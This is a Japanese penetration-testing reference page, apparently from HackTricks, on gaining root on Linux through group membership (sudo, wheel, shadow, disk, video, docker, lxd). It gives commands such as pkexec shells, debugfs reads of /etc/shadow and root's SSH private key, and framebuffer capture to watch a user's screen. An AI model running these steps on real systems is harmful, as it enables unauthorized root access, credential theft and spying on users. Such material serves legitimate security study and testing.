{{#include ../../banners/hacktricks-training.md}}

# Sudo/Admin グループ

## **PE - メソッド 1**

**時々**、**デフォルトで（またはいくつかのソフトウェアが必要とするために）** **/etc/sudoers** ファイル内にこれらの行のいくつかを見つけることができます：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
これは、**sudoまたはadminグループに属する任意のユーザーがsudoとして何でも実行できる**ことを意味します。

この場合、**rootになるには次のように実行するだけです**:
```text
sudo su
```
## PE - Method 2

すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるかどうかを確認します:
```bash
find / -perm -4000 2>/dev/null
```
バイナリ pkexec が SUID バイナリであり、あなたが sudo または admin に属している場合、pkexec を使用して sudo としてバイナリを実行できる可能性があります。次の内容を確認してください:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
そこでは、どのグループが**pkexec**を実行することを許可されているか、そして**デフォルトで**いくつかのLinuxに**sudoやadmin**のグループが**表示される**かを見つけることができます。

**rootになるには、次のコマンドを実行できます**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
**pkexec**を実行しようとしたときにこの**エラー**が表示される場合：
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**権限がないからではなく、GUIなしで接続されていないからです**。この問題の回避策があります: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
# Wheel Group

**時々**、**デフォルトで** **/etc/sudoers** ファイル内にこの行を見つけることができます:
```text
%wheel	ALL=(ALL:ALL) ALL
```
これは、**wheelグループに属する任意のユーザーがsudoとして何でも実行できる**ことを意味します。

この場合、**rootになるには次のように実行するだけです**:
```text
sudo su
```
# Shadow Group

**shadow** グループのユーザーは **/etc/shadow** ファイルを **読む** ことができます:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
そうですね、ファイルを読んで**ハッシュをいくつかクラッキング**してみましょう。

# ディスクグループ

この特権はほぼ**ルートアクセスと同等**であり、マシン内のすべてのデータにアクセスできます。

ファイル:`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
注意してほしいのは、debugfsを使用すると**ファイルを書き込む**こともできるということです。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
しかし、**rootが所有するファイル**（例えば`/etc/shadow`や`/etc/passwd`）に書き込もうとすると、"**Permission denied**"エラーが発生します。

# Video Group

コマンド`w`を使用すると、**システムにログインしているユーザー**を見つけることができ、次のような出力が表示されます：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**は、ユーザー**yossiが物理的に**マシンのターミナルにログインしていることを意味します。

**video group**は、画面出力を表示するアクセス権を持っています。基本的に、画面を観察することができます。そのためには、**画面上の現在の画像を生データで取得**し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**生の画像**を**開く**には、**GIMP**を使用し、**`screen.raw`**ファイルを選択し、ファイルタイプとして**Raw image data**を選択します：

![](../../images/image%20%28208%29.png)

次に、幅と高さを画面で使用されているものに変更し、異なる画像タイプを確認して（画面をより良く表示するものを選択します）：

![](../../images/image%20%28295%29.png)

# Root Group

デフォルトでは、**rootグループのメンバー**は、いくつかの**サービス**設定ファイルやいくつかの**ライブラリ**ファイル、または特権昇格に使用できる**他の興味深いもの**を**変更**するアクセス権を持っているようです...

**rootメンバーが変更できるファイルを確認する**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Dockerグループ

ホストマシンのルートファイルシステムをインスタンスのボリュームにマウントできます。インスタンスが起動すると、そのボリュームに`chroot`を即座にロードします。これにより、実質的にマシン上でroot権限を得ることができます。

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

# lxc/lxdグループ

[lxc - 特権昇格](lxd-privilege-escalation.md)

{{#include ../../banners/hacktricks-training.md}}
